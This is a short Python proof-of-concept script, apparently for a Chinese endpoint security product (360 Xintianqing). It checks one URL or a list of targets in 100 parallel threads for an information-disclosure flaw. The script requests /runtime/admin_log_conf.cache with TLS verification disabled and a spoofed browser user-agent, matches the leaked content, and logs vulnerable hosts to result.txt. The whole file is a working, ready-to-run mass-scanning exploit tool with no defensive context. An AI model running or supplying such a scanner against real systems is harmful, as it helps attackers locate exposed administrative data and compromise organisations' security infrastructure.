import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="360 新天擎终端安全管理系统信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/runtime/admin_log_conf.cache'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        match = re.findall(r's:12:"(.*?)";a:2:',res.text,re.S)
        if res.status_code == 200 and match[0] == '/login/login':
            print(f'[+]存在漏洞：{target}')
            with open("result.txt",'a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()